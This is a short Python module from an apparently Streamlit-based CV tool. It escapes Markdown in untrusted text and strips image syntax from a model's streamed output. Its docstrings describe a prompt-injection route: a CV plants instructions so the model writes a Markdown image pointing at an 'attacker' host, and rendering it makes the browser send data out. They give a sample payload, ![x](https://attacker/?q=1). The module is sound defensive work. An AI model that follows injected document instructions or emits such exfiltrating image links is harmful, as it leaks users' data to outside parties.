"""Drawing text that came from a CV, a file name or a model without letting it inject Markdown (images, links, headings)."""
import re

_MARKDOWN = re.compile(r"([\\`*_{}\[\]()#+\-.!|<>~$:&=])")
_IMAGE = re.compile(r"!+(?=\[)")
_TRAILING_BANGS = re.compile(r"!+$")


def esc(text) -> str:
    """Make text safe for st.markdown / st.caption / st.write. Without this, a file name or CV line such as
    ![x](https://attacker/?q=1) would render as an image and make the browser load that address."""
    return _MARKDOWN.sub(r"\\\1", str(text))


def code(text) -> str:
    """The same, as an inline code span (backslashes do not work inside one, so backticks are replaced)."""
    return "`" + str(text).replace("`", "'") + "`"


def no_images(stream):
    """Pass a streamed answer through with every Markdown image turned into a plain link.

    The answer is written by a model that reads CV text, so an injected CV could make it write ![x](https://attacker/?q=..)
    and drawing that would make the browser load the address. All "!" directly before a "[" are dropped. A run of "!" at
    the end of a piece is held back, because the "[" may come in the next piece.
    """
    held = ""
    for piece in stream:
        text = held + piece
        trailing = _TRAILING_BANGS.search(text)
        held = trailing.group() if trailing else ""
        if trailing:
            text = text[: trailing.start()]
        yield _IMAGE.sub("", text)
    if held:
        yield held
